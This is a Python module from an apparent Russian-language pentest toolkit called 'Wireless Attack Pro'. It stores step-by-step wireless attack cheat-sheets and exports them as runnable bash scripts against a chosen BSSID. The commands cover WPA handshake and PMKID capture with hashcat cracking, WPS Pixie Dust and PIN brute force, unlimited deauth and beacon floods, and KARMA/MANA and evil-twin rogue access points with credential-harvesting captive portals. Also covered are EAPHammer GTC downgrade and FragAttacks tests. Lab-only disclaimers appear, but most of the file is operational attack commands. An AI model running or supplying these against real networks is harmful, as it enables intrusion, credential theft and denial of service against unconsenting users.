"""
Wireless Attack Pro (extended).
Author: idqwixxa

⚠ ТОЛЬКО для ЛАБОРАТОРНЫХ условий / CTF / собственных сетей
с явным письменным разрешением.

Возможности:
    ─── Attacks (cheat-sheets) ───
    - WPA3 SAE (Dragonblood / downgrade)
    - PMKID v2 (hcxdumptool + hashcat 22000)
    - KARMA / MANA (hostapd-mana + responder)
    - WPS Pixie Dust (reaver -K 1)
    - WPS brute (reaver/bully)
    - Evil Twin + captive portal
    - Deauth flood (aireplay-ng)
    - Beacon flood (mdk4)
    - Authentication DoS (mdk4)
    - Handshake capture (airodump-ng workflow)
    - EAPHammer (WPA2-Enterprise)
    - Wi-Fi Pineapple-style (rogue AP)
    - FragAttacks (CVE-2020-24586..24588)

    ─── Tools ───
    - 25+ инструментов (aircrack/hcxdumptool/hashcat/reaver/hostapd-mana
      /bettercap/responder/mdk4/eaphammer/wifite/...)

    ─── Scripts ───
    - Генерация bash-скриптов для каждой техники
    - Session logging (что запускалось)
    - Автосохранение в reports/wireless_pro/

    ─── Интеграция ───
    - Findings → notes (при обнаружении уязвимостей)
    - Notify (при экспорте активных скриптов)
    - Экспорт: JSON / CSV / Markdown / HTML
"""
import csv
import html as html_mod
import json
import os
import re
import shutil
import subprocess
import sys
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Any

from rich.console import Console
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.table import Table
from rich.panel import Panel

from core.config import REPORT_DIR
from core.database import db
from core.logger import get_logger

console = Console()
log = get_logger(__name__)

WA_DIR = REPORT_DIR / "wireless_pro"
WA_DIR.mkdir(parents=True, exist_ok=True)


# ===========================================================================
# Findings integration
# ===========================================================================

@dataclass
class WAFinding:
    kind: str
    severity: str
    title: str
    target: str = ""
    evidence: str = ""
    data: dict = field(default_factory=dict)


def _save_finding(f: WAFinding) -> int:
    if f.severity not in ("critical", "high"):
        return -1
    try:
        from modules import notes
        return notes.add_note(
            kind="finding",
            title=f.title,
            target=f.target,
            severity=f.severity,
            status="open",
            tags=["wireless-pro", f.kind],
            body=(f"**Kind:** {f.kind}\n"
                  f"**Target:** {f.target}\n\n"
                  f"**Evidence:**\n```\n{(f.evidence or '—')[:1500]}\n```\n\n"
                  f"**Data:** `{json.dumps(f.data, ensure_ascii=False, default=str)[:1000]}`"),
        )
    except Exception:
        return -1


def _notify(title: str, msg: str, severity: str = "high") -> None:
    try:
        from modules import notifier
        notifier.notify_all(title, msg, severity=severity)
    except Exception:
        pass


# ===========================================================================
# Tools check (расширено)
# ===========================================================================

TOOLS = [
    ("aircrack-ng", "aircrack-ng", "WPA handshake crack"),
    ("airodump-ng", "airodump-ng", "Sniffing"),
    ("aireplay-ng", "aireplay-ng", "Deauth/injection"),
    ("airmon-ng", "airmon-ng", "Monitor mode"),
    ("hcxdumptool", "hcxdumptool", "PMKID capture v2"),
    ("hcxpcapngtool", "hcxpcapngtool", "Convert to 22000"),
    ("hashcat", "hashcat", "GPU cracking"),
    ("reaver", "reaver", "WPS"),
    ("bully", "bully", "WPS alt"),
    ("wash", "wash", "WPS scan"),
    ("hostapd", "hostapd", "AP"),
    ("hostapd-mana", "hostapd-mana", "KARMA/MANA"),
    ("dnsmasq", "dnsmasq", "DHCP/DNS"),
    ("mdk4", "mdk4", "Beacon flood / deauth"),
    ("bettercap", "bettercap", "MITM"),
    ("responder", "responder", "LLMNR/NBT-NS"),
    ("wpa_supplicant", "wpa_supplicant", "Client"),
    ("wpa_sycophant", "wpa_sycophant", "WPA3 downgrade helper"),
    ("eaphammer", "eaphammer", "WPA2-Enterprise"),
    ("wifite", "wifite", "Auto wireless auditor"),
    ("airgeddon", "airgeddon", "All-in-one wireless"),
    ("pixiewps", "pixiewps", "Pixie Dust engine"),
    ("cowpatty", "cowpatty", "WPA-PSK cracker"),
    ("tshark", "tshark", "PCAP analysis"),
    ("iw", "iw", "Интерфейсы"),
    ("nmcli", "nmcli", "NetworkManager CLI"),
]


def check_tools() -> dict[str, bool]:
    return {name: shutil.which(bin_) is not None
            for name, bin_, _ in TOOLS}


def _print_tools() -> None:
    status = check_tools()
    t = Table(title=f"🔧 Wireless Attack Pro — tools ({len(TOOLS)})")
    t.add_column("Tool", style="cyan")
    t.add_column("Purpose", style="white", max_width=30)
    t.add_column("Status", width=10)
    for name, _b, desc in TOOLS:
        ok = status.get(name, False)
        t.add_row(name, desc,
                  "[green]✓[/green]" if ok else "[red]✗[/red]")
    console.print(t)

    ok_count = sum(1 for v in status.values() if v)
    console.print(f"\n[cyan]Установлено: {ok_count}/{len(TOOLS)}[/cyan]")

    if not any(status.values()):
        console.print("\n[yellow]Установи инструменты:[/yellow]")
        console.print("[dim]sudo apt install aircrack-ng hcxdumptool "
                      "hashcat reaver hostapd hostapd-mana dnsmasq "
                      "mdk4 bettercap responder eaphammer wifite "
                      "airgeddon pixiewps cowpatty tshark[/dim]")


def _require_linux() -> bool:
    if not sys.platform.startswith("linux"):
        console.print("[red]Этот модуль работает только на Linux "
                      "(Kali/Parrot).[/red]")
        return False
    return True


# ===========================================================================
# Cheat-sheets (расширено)
# ===========================================================================

CHEATSHEETS = {
    "wpa3-sae": {
        "title": "WPA3 SAE (Dragonblood / Downgrade)",
        "steps": [
            ("1. Проверка WPA3",
             "# Проверь, включён ли WPA3 (SAE) на точке\n"
             "sudo airodump-ng {iface_mon} --wps\n"
             "# Или через wash — если есть 'WPA3', поддержка включена"),
            ("2. Transition mode (WPA2/WPA3 mix)",
             "# Если точка в transition mode — возможен downgrade:\n"
             "# Клиент поддерживает WPA2 — обманом переключаем\n"
             "sudo airmon-ng start {iface}\n"
             "# Используй wpa_sycophant для эмуляции жертвы"),
            ("3. wpa_sycophant setup",
             "# Создаём конфиг хостапа для fake AP\n"
             "cat > hostapd.conf <<EOF\n"
             "interface={iface}\n"
             "driver=nl80211\n"
             "ssid={ssid}\n"
             "channel={channel}\n"
             "wpa=2\n"
             "wpa_key_mgmt=WPA-PSK\n"
             "rsn_pairwise=CCMP\n"
             "EOF\n\n"
             "# Запускаем sycophant (клиент)\n"
             "sudo ./wpa_sycophant.sh -c syco.conf -i {iface}"),
            ("4. Dragonblood (CVE-2019-9494/9495)",
             "# Проверка timing/cache side-channel\n"
             "# Инструменты: dragonslayer (Openssl) или dragonblood-downgrade\n"
             "git clone https://github.com/vanhoefm/dragonslayer.git\n"
             "# Внимание: работает только против уязвимых AP"),
            ("5. Deauth WPA3",
             "# WPA3 SAE НЕ уязвим к обычному deauth (есть PMF/802.11w)\n"
             "# Но можно flooding для Downgrade (если transition):\n"
             "sudo aireplay-ng --deauth 100 -a {bssid} {iface_mon}"),
            ("6. Crack captured handshake (если получен)",
             "hcxpcapngtool -o hash.hc22000 dump.pcapng\n"
             "hashcat -m 22000 hash.hc22000 wordlist.txt"),
        ],
    },
    "pmkid-v2": {
        "title": "PMKID v2 (hcxdumptool)",
        "steps": [
            ("1. Отключить NetworkManager",
             "sudo systemctl stop NetworkManager\n"
             "sudo airmon-ng check kill"),
            ("2. НЕ включать monitor mode",
             "# hcxdumptool требует managed режим\n"
             "sudo ip link set {iface} down\n"
             "sudo iw dev {iface} set type managed\n"
             "sudo ip link set {iface} up"),
            ("3. Запуск passive capture",
             "sudo hcxdumptool -i {iface} -o dump.pcapng \\\n"
             "    --enable_status=1 --active_beacon --attemptap \\\n"
             "    --attemptclient --tot=120\n"
             "# Опционально фильтр: --filterlist_ap=targets.txt"),
            ("4. Остановить (Ctrl+C) и конвертировать",
             "hcxpcapngtool -o hash.hc22000 dump.pcapng\n"
             "# С ESSID-листом:\n"
             "hcxpcapngtool -o hash.hc22000 -E essid.txt dump.pcapng"),
            ("5. Проверить содержимое",
             "cat hash.hc22000\n"
             "# Формат: WPA*01*pmkid*ap_mac*client_mac*essid"),
            ("6. Крэк (hashcat 22000)",
             "hashcat -m 22000 hash.hc22000 wordlist.txt\n"
             "# С правилами:\n"
             "hashcat -m 22000 hash.hc22000 wordlist.txt "
             "-r /usr/share/hashcat/rules/best64.rule"),
            ("7. Восстановить NetworkManager",
             "sudo systemctl start NetworkManager"),
        ],
    },
    "karma-mana": {
        "title": "KARMA / MANA attack (hostapd-mana)",
        "steps": [
            ("1. Что делает",
             "# KARMA: fake AP отвечает на все probe requests\n"
             "# MANA: улучшенная версия — правильные ответы на probe\n"
             "# Цель: клиенты подключаются к нам автоматически"),
            ("2. Установка hostapd-mana",
             "git clone https://github.com/sensepost/hostapd-mana\n"
             "cd hostapd-mana && make"),
            ("3. Конфиг",
             "cat > mana.conf <<EOF\n"
             "interface={iface}\n"
             "driver=nl80211\n"
             "ssid=Free WiFi\n"
             "channel=6\n"
             "hw_mode=g\n"
             "enable_mana=1\n"
             "mana_loud=1\n"
             "mana_credout=credentials.txt\n"
             "mana_wpe=1\n"
             "mana_eapsuccess=1\n"
             "enable_karma=1\n"
             "EOF"),
            ("4. Запуск",
             "sudo hostapd-mana mana.conf\n"
             "# + dnsmasq для DHCP/DNS:\n"
             "sudo dnsmasq -C dnsmasq.conf -d"),
            ("5. Автоматический captive portal",
             "# Когда клиент подключится, поднимаем nginx с phishing\n"
             "python main.py se-server -p 80"),
            ("6. Сбор credentials",
             "# hostapd-mana сохраняет WPA handshakes в mana.log\n"
             "cat credentials.txt\n"
             "# Если клиент отправлял MSCHAPv2 — в hostapd-mana log"),
            ("7. Опционально: Responder",
             "# Для LLMNR/NBT-NS/MDNS poisoning\n"
             "sudo responder -I {iface} -wv"),
        ],
    },
    "pixie-dust": {
        "title": "WPS Pixie Dust (reaver)",
        "steps": [
            ("1. Включить monitor mode",
             "sudo airmon-ng start {iface}"),
            ("2. Скан WPS-точек",
             "sudo wash -i {iface_mon} -C\n"
             "# WPS Locked=No → можно атаковать"),
            ("3. Pixie Dust (быстрее)",
             "sudo reaver -i {iface_mon} -b {bssid} -c {channel} \\\n"
             "    -K 1 -vv -S -N\n"
             "# -K 1 = Pixie Dust\n"
             "# -S = small DH keys\n"
             "# -N = no Nagle\n"
             "# -vv = verbose"),
            ("4. Если Pixie Dust не сработал — brute PIN",
             "sudo reaver -i {iface_mon} -b {bssid} -c {channel} \\\n"
             "    -vv -d 3 -T 15\n"
             "# Может занять часы"),
            ("5. bully (альтернатива)",
             "sudo bully -b {bssid} -c {channel} -d {iface_mon} "
             "-v 3 -S -F -B"),
            ("6. Результат",
             "# reaver выведет:\n"
             "# [+] WPS PIN: '12345678'\n"
             "# [+] WPA PSK: 'MyPassword'"),
            ("7. Очистка",
             "sudo airmon-ng stop {iface_mon}\n"
             "sudo systemctl restart NetworkManager"),
        ],
    },
    "deauth-beacon": {
        "title": "Deauth + Beacon flood (mdk4)",
        "steps": [
            ("1. Deauth всех клиентов",
             "sudo aireplay-ng --deauth 0 -a {bssid} {iface_mon}\n"
             "# 0 = бесконечно"),
            ("2. Targeted deauth",
             "sudo aireplay-ng --deauth 10 -a {bssid} "
             "-c {client_mac} {iface_mon}"),
            ("3. Beacon flood",
             "sudo mdk4 {iface_mon} b -f ssid_list.txt -s 1000\n"
             "# Или случайные SSID\n"
             "sudo mdk4 {iface_mon} b -s 10000"),
            ("4. Authentication DoS",
             "sudo mdk4 {iface_mon} a -a {bssid} -m"),
            ("5. Deauth specific (mdk4)",
             "sudo mdk4 {iface_mon} d -B {bssid}"),
            ("6. Восстановление",
             "sudo airmon-ng stop {iface_mon}\n"
             "sudo systemctl restart NetworkManager"),
        ],
    },
    "evil-twin": {
        "title": "Evil Twin + Captive Portal",
        "steps": [
            ("1. Подготовка интерфейса",
             "sudo ip link set {iface} down\n"
             "sudo ip addr flush dev {iface}\n"
             "sudo ip addr add 10.0.0.1/24 dev {iface}\n"
             "sudo ip link set {iface} up"),
            ("2. hostapd конфиг",
             "cat > hostapd.conf <<EOF\n"
             "interface={iface}\n"
             "driver=nl80211\n"
             "ssid={ssid}\n"
             "channel=6\n"
             "hw_mode=g\n"
             "wpa=2\n"
             "wpa_passphrase=12345678\n"
             "wpa_key_mgmt=WPA-PSK\n"
             "rsn_pairwise=CCMP\n"
             "EOF\n"
             "sudo hostapd hostapd.conf &"),
            ("3. dnsmasq (DHCP + captive portal)",
             "cat > dnsmasq.conf <<EOF\n"
             "interface={iface}\n"
             "dhcp-range=10.0.0.10,10.0.0.100,12h\n"
             "dhcp-option=3,10.0.0.1\n"
             "dhcp-option=6,10.0.0.1\n"
             "address=/#/10.0.0.1\n"
             "log-queries\n"
             "log-dhcp\n"
             "EOF\n"
             "sudo dnsmasq -C dnsmasq.conf -d &"),
            ("4. Captive portal",
             "python main.py se-server -p 80 -t employee-portal \\\n"
             "    -r https://example.com"),
            ("5. NAT",
             "sudo sysctl -w net.ipv4.ip_forward=1\n"
             "sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\n"
             "sudo iptables -A FORWARD -i {iface} -o eth0 -j ACCEPT"),
            ("6. Мониторинг",
             "cat /var/lib/misc/dnsmasq.leases\n"
             "sudo tail -f /var/log/syslog | grep dnsmasq"),
            ("7. Остановка",
             "sudo pkill hostapd\n"
             "sudo pkill dnsmasq\n"
             "sudo ip addr del 10.0.0.1/24 dev {iface}"),
        ],
    },
    "eaphammer": {
        "title": "EAPHammer (WPA2-Enterprise)",
        "steps": [
            ("1. Установка EAPHammer",
             "git clone https://github.com/s0lst1c3/eaphammer.git\n"
             "cd eaphammer && sudo ./kali-setup"),
            ("2. Проверка цели",
             "# Проверь, используется ли WPA2-Enterprise (802.1X)\n"
             "sudo airodump-ng {iface_mon} --encrypt WPA2\n"
             "# Enterprise = 'MGT' в колонке Privacy"),
            ("3. Hostile portal attack",
             "sudo ./eaphammer -i {iface} --channel {channel} \\\n"
             "    --auth wpa-eap --essid {ssid} --creds \\\n"
             "    --negotiate balanced"),
            ("4. Автоматический captive portal",
             "sudo ./eaphammer -i {iface} --channel {channel} \\\n"
             "    --auth wpa-eap --essid {ssid} --creds \\\n"
             "    --portal --portal-port 80"),
            ("5. GTC downgrade",
             "# Если клиент поддерживает GTC — можно вытянуть пароль\n"
             "sudo ./eaphammer -i {iface} --channel {channel} \\\n"
             "    --auth wpa-eap --essid {ssid} --creds \\\n"
             "    --gtc-downgrade"),
            ("6. Crack EAP-MSCHAPv2",
             "# Если получили challenge/response:\n"
             "hashcat -m 5500 mschapv2.hash wordlist.txt"),
        ],
    },
    "fragattacks": {
        "title": "FragAttacks (CVE-2020-24586..24588)",
        "steps": [
            ("1. Что это",
             "# Fragment + Aggregation attacks на 802.11\n"
             "# Затрагивает почти все Wi-Fi устройства (2020)\n"
             "# CVEs: 24586, 24587, 24588"),
            ("2. Проверка уязвимости",
             "# Инструмент: fragattack (vanhoefm)\n"
             "git clone https://github.com/vanhoefm/fragattacks.git\n"
             "cd fragattacks && ./build.sh"),
            ("3. Тест клиента",
             "# Уязвимая сеть + кастомный scapy\n"
             "sudo ./fragattack.py --iface {iface_mon} --test "
             "ping --ap {bssid}"),
            ("4. Тест на агрегацию",
             "sudo ./fragattack.py --iface {iface_mon} --test "
             "agg --ap {bssid}"),
            ("5. Результат",
             "# Инструмент покажет: уязвим ли AP/клиент\n"
             "# Проверь vendor patch (все производители закрыли в 2021)"),
        ],
    },
    "handshake": {
        "title": "WPA Handshake (airodump workflow)",
        "steps": [
            ("1. Kill мешающие процессы",
             "sudo airmon-ng check kill"),
            ("2. Monitor mode",
             "sudo airmon-ng start {iface}"),
            ("3. Скан эфира",
             "sudo airodump-ng {iface_mon}"),
            ("4. Capture целевой сети",
             "sudo airodump-ng -c {channel} --bssid {bssid} "
             "-w capture {iface_mon}"),
            ("5. Deauth (в другом окне)",
             "sudo aireplay-ng -0 10 -a {bssid} -c {client_mac} "
             "{iface_mon}"),
            ("6. Проверка",
             "sudo aircrack-ng capture-01.cap"),
            ("7. Конвертация + крэк",
             "hcxpcapngtool -o hash.hc22000 capture-01.cap\n"
             "hashcat -m 22000 hash.hc22000 wordlist.txt"),
            ("8. Остановка",
             "sudo airmon-ng stop {iface_mon}\n"
             "sudo systemctl restart NetworkManager"),
        ],
    },
    "wifite": {
        "title": "Wifite (авто-аудит)",
        "steps": [
            ("1. Что делает",
             "# Wifite — автоматизирует всё: scan → handshake → WPS → PMKID\n"
             "# Идеально для быстрого аудита"),
            ("2. Проверка интерфейса",
             "sudo airmon-ng\n"
             "# Если интерфейс занят — kill мешающие процессы"),
            ("3. Базовый запуск",
             "sudo wifite"),
            ("4. Только WPA",
             "sudo wifite --wpa"),
            ("5. Только WPS",
             "sudo wifite --wps --wps-only"),
            ("6. С конкретным интерфейсом",
             "sudo wifite -i {iface_mon}"),
            ("7. С сохранением",
             "sudo wifite --dict /usr/share/wordlists/rockyou.txt "
             "--crack"),
        ],
    },
}


# ===========================================================================
# Cheat-sheet display
# ===========================================================================

def show_cheatsheet(name: str, iface: str = "wlan0",
                    bssid: str = "AA:BB:CC:DD:EE:FF",
                    channel: str = "6", ssid: str = "Free WiFi",
                    client: str = "11:22:33:44:55:66") -> None:
    sheet = CHEATSHEETS.get(name)
    if not sheet:
        console.print(f"[red]Неизвестный cheat-sheet: {name}[/red]")
        console.print(f"[dim]Доступно: {', '.join(CHEATSHEETS.keys())}"
                      f"[/dim]")
        return

    ctx = {
        "iface": iface, "iface_mon": f"{iface}mon",
        "bssid": bssid, "channel": channel, "ssid": ssid,
        "client_mac": client,
    }

    console.print(f"\n[bold cyan]═══ {sheet['title']} ═══[/bold cyan]\n")
    for title, cmd in sheet["steps"]:
        t = Table(title=f"[bold green]{title}[/bold green]",
                  show_header=False, border_style="dim")
        t.add_column("Command")
        try:
            formatted = cmd.format(**ctx)
        except KeyError:
            formatted = cmd
        for line in formatted.split("\n"):
            t.add_row(f"[green]{line}[/green]")
        console.print(t)

    console.print("\n[yellow]⚠ Только для авторизованного пентеста / "
                  "CTF.[/yellow]")
    db.save_scan("wireless_pro_cheatsheet", name,
                 {"iface": iface, "bssid": bssid})


def list_cheatsheets() -> None:
    t = Table(title=f"📚 Wireless Attack Pro — cheat-sheets "
                    f"({len(CHEATSHEETS)})")
    t.add_column("Key", style="cyan")
    t.add_column("Title", style="white")
    t.add_column("Steps", style="green", width=6)
    for key, sheet in CHEATSHEETS.items():
        t.add_row(key, sheet["title"], str(len(sheet["steps"])))
    console.print(t)


# ===========================================================================
# Script export
# ===========================================================================

def export_script(name: str, iface: str, bssid: str, channel: str,
                  ssid: str = "Free WiFi",
                  out_path: str | None = None) -> Path | None:
    """Экспортировать cheat-sheet в bash-скрипт."""
    sheet = CHEATSHEETS.get(name)
    if not sheet:
        console.print(f"[red]Неизвестный cheat-sheet: {name}[/red]")
        return None

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe = re.sub(r"[^A-Za-z0-9._-]", "_", name)
    if not out_path:
        path = WA_DIR / f"{safe}_{ts}.sh"
    else:
        path = Path(out_path)

    ctx = {
        "iface": iface, "iface_mon": f"{iface}mon",
        "bssid": bssid, "channel": channel, "ssid": ssid,
        "client_mac": "AA:BB:CC:DD:EE:FF",
    }

    lines = [
        "#!/usr/bin/env bash",
        f"# Wireless Attack: {sheet['title']}",
        f"# Generated: {datetime.now().isoformat()}",
        f"# Target: BSSID={bssid}, channel={channel}, iface={iface}",
        "",
        "set -e",
        "",
    ]
    for title, cmd in sheet["steps"]:
        lines.append(f"# ===== {title} =====")
        try:
            lines.append(cmd.format(**ctx))
        except KeyError:
            lines.append(cmd)
        lines.append("")

    try:
        path.write_text("\n".join(lines), encoding="utf-8")
        try:
            os.chmod(path, 0o755)
        except Exception:
            pass
        console.print(f"[green]✓ Script: {path}[/green]")
        db.save_scan("wireless_pro_export", name,
                     {"path": str(path)})
        _save_finding(WAFinding(
            kind="wireless_pro_script",
            severity="high",
            title=f"Wireless attack script: {name}",
            target=bssid,
            evidence=f"Path: {path}\nInterface: {iface}\n"
                     f"Channel: {channel}",
            data={"script": name, "bssid": bssid,
                  "iface": iface, "path": str(path)},
        ))
        _notify(
            f"📶 Wireless script: {name}",
            f"Target: {bssid}\nPath: {path}",
            severity="medium",
        )
        return path
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Ошибка: {exc}[/red]")
        return None


# ===========================================================================
# Экспорт cheat-sheets
# ===========================================================================

def export_cheatsheets_md(out_path: str | None = None) -> Path | None:
    if not out_path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        out_path = str(WA_DIR / f"cheatsheets_{ts}.md")
    lines = [
        "# Wireless Attack Pro — cheat-sheets",
        f"_Generated: {datetime.now().isoformat()}_",
        f"_Total: {len(CHEATSHEETS)}_",
        "",
    ]
    for key, sheet in CHEATSHEETS.items():
        lines.append(f"## {sheet['title']} (`{key}`)")
        lines.append("")
        for title, cmd in sheet["steps"]:
            lines.append(f"### {title}")
            lines.append("```bash")
            lines.append(cmd)
            lines.append("```")
            lines.append("")
    try:
        Path(out_path).write_text("\n".join(lines), encoding="utf-8")
        console.print(f"[green]✓ MD: {out_path}[/green]")
        return Path(out_path)
    except Exception as exc:
        console.print(f"[red]MD: {exc}[/red]")
        return None


def export_cheatsheets_html(out_path: str | None = None) -> Path | None:
    if not out_path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        out_path = str(WA_DIR / f"cheatsheets_{ts}.html")
    parts = [
        "<!DOCTYPE html><html lang='ru'><head>"
        "<meta charset='utf-8'>",
        "<title>Wireless Attack Pro — cheat-sheets</title>",
        "<style>",
        "body{background:#0a0a0a;color:#c8c8c8;"
        "font-family:monospace;padding:24px;max-width:1300px;"
        "margin:0 auto;line-height:1.5;}",
        "h1{color:#00ff9c;border-bottom:2px solid #00ff9c;}",
        "h2{color:#00ff9c;margin-top:32px;}",
        "h3{color:#7ad9ff;margin-top:20px;}",
        ".toc a{color:#7ad9ff;text-decoration:none;margin-right:12px;}"
        ".toc a:hover{color:#00ff9c;}",
        "pre{background:#111;border:1px solid #222;border-radius:6px;"
        "padding:10px;overflow-x:auto;color:#a0ffa0;font-size:12px;}",
        "table{width:100%;border-collapse:collapse;margin:12px 0;}",
        "th{background:#111;color:#00ff9c;padding:6px;"
        "text-align:left;border:1px solid #222;}",
        "td{padding:4px 6px;border:1px solid #222;}",
        "</style></head><body>",
        f"<h1>📶 Wireless Attack Pro — cheat-sheets "
        f"({len(CHEATSHEETS)})</h1>",
        f"<p>Generated: "
        f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>",
        "<div class='toc'>",
    ]
    for key in CHEATSHEETS:
        parts.append(f"<a href='#{key}'>{key}</a>")
    parts.append("</div>")

    for key, sheet in CHEATSHEETS.items():
        parts.append(f"<h2 id='{key}'>{html_mod.escape(sheet['title'])} "
                     f"<small>(<code>{html_mod.escape(key)}</code>)"
                     f"</small></h2>")
        for title, cmd in sheet["steps"]:
            parts.append(f"<h3>{html_mod.escape(title)}</h3>")
            parts.append(f"<pre>{html_mod.escape(cmd)}</pre>")

    parts.append("</body></html>")
    try:
        Path(out_path).write_text("\n".join(parts), encoding="utf-8")
        console.print(f"[green]✓ HTML: {out_path}[/green]")
        return Path(out_path)
    except Exception as exc:
        console.print(f"[red]HTML: {exc}[/red]")
        return None


def export_cheatsheets_json(out_path: str | None = None) -> Path | None:
    if not out_path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        out_path = str(WA_DIR / f"cheatsheets_{ts}.json")
    try:
        Path(out_path).write_text(json.dumps({
            "generated": datetime.now().isoformat(),
            "count": len(CHEATSHEETS),
            "cheatsheets": CHEATSHEETS,
        }, indent=2, ensure_ascii=False), encoding="utf-8")
        console.print(f"[green]✓ JSON: {out_path}[/green]")
        return Path(out_path)
    except Exception as exc:
        console.print(f"[red]JSON: {exc}[/red]")
        return None


# ===========================================================================
# CLI
# ===========================================================================

def cli_tools() -> None:
    _print_tools()


def cli_cheatsheets() -> None:
    list_cheatsheets()


def cli_cheat(name: str) -> None:
    show_cheatsheet(name)


def cli_export(name: str) -> None:
    """CLI-обёртка: экспорт одного cheat-sheet."""
    iface = Prompt.ask("Interface", default="wlan0")
    bssid = Prompt.ask("BSSID", default="AA:BB:CC:DD:EE:FF")
    ch = Prompt.ask("Channel", default="6")
    ssid = Prompt.ask("SSID", default="Free WiFi")
    export_script(name, iface, bssid, ch, ssid)


def cli_export_all() -> None:
    """Экспорт всех cheat-sheets."""
    export_cheatsheets_md()
    export_cheatsheets_html()
    export_cheatsheets_json()


# ===========================================================================
# Меню
# ===========================================================================

def menu() -> None:
    t = Table(title="[bold]📶 Wireless Attack Pro (extended)[/bold]")
    t.add_column("№", style="yellow")
    t.add_column("Опция")
    opts = [
        ("1", f"Проверить tools ({len(TOOLS)})"),
        ("2", f"Список cheat-sheets ({len(CHEATSHEETS)})"),
        ("3", "WPA3 SAE / Dragonblood"),
        ("4", "PMKID v2 (hcxdumptool)"),
        ("5", "KARMA / MANA (hostapd-mana)"),
        ("6", "WPS Pixie Dust (reaver)"),
        ("7", "Deauth + Beacon flood (mdk4)"),
        ("8", "Evil Twin + Captive Portal"),
        ("9", "EAPHammer (WPA2-Enterprise)"),
        ("10", "FragAttacks"),
        ("11", "WPA Handshake workflow"),
        ("12", "Wifite auto-audit"),
        ("13", "Экспорт cheat-sheet в bash-скрипт"),
        ("14", "Экспорт всех cheat-sheets (MD/HTML/JSON)"),
    ]
    for n, o in opts:
        t.add_row(n, o)
    console.print(t)
    console.print("[yellow]⚠ Только для авторизованного пентеста / "
                  "CTF.[/yellow]")
    c = Prompt.ask("Выбор", choices=[o[0] for o in opts])

    if c == "1":
        _print_tools()
    elif c == "2":
        list_cheatsheets()
    elif c in ("3", "4", "5", "6", "7", "8", "9", "10", "11", "12"):
        key_map = {
            "3": "wpa3-sae", "4": "pmkid-v2", "5": "karma-mana",
            "6": "pixie-dust", "7": "deauth-beacon",
            "8": "evil-twin", "9": "eaphammer",
            "10": "fragattacks", "11": "handshake", "12": "wifite",
        }
        iface = Prompt.ask("Interface", default="wlan0")
        bssid = Prompt.ask("BSSID (цель)", default="AA:BB:CC:DD:EE:FF")
        ch = Prompt.ask("Channel", default="6")
        ssid = Prompt.ask("SSID (для evil-twin/karma)",
                          default="Free WiFi")
        show_cheatsheet(key_map[c], iface, bssid, ch, ssid)
    elif c == "13":
        name = Prompt.ask("Cheat-sheet key",
                          choices=list(CHEATSHEETS.keys()),
                          default="pmkid-v2")
        iface = Prompt.ask("Interface", default="wlan0")
        bssid = Prompt.ask("BSSID", default="AA:BB:CC:DD:EE:FF")
        ch = Prompt.ask("Channel", default="6")
        ssid = Prompt.ask("SSID", default="Free WiFi")
        export_script(name, iface, bssid, ch, ssid)
    elif c == "14":
        cli_export_all()